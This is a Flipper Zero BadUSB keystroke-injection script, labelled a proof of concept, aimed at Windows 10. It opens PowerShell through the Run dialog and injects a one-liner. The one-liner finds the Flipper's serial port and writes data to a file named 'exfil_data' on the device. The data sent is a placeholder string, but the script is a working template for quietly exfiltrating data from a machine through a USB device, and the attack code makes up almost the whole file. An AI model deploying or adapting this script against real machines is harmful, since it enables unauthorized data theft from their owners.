REM Title: Save To Flipper PoC
REM Author: emptythevoid
REM Target: Windows 10 (not tested on Windows 11, yet)
REM Version: 1.0
REM Category: PoC

REM Open Powershell
DELAY 500
GUI r
DELAY 500
STRING powershell
DELAY 500
ENTER
DELAY 750

REM Flipper will inject the inline powershell and run it.
REM The powershell starts with a delay. This is to give you time to hit BACK twice on the Flipper to get it out of BadUSB mode. Otherwise it won't save data
REM After the delay, the script will try to determine which COM port the Flipper is plugged into and will write a string to the specified file path.

STRING Start-Sleep -Seconds 10; $mydevs = (Get-PnPDevice | Where-Object{$_.PNPClass -in  "WPD","AndroidUsbDeviceClass","Modem","Ports" } | Where-Object{$_.Present -in "True"} | Where-Object{$_.Service -in "usbser"} | Select-Object Name,DeviceID | Sort-Object Name) | Select-String -Pattern 'COM'; $splitcom = $mydevs -split ("COM"); $portnum = $splitcom[1][0]; $port = New-Object System.IO.Ports.SerialPort COM$portnum,115200,None,8,one; $port.open(); $port.Write("storage write /ext/apps_data/exfil_data`r`n"); $port.Write("This is exfiltrated data`r`n"); $port.Write("$([char] 3)"); $port.Close()
ENTER
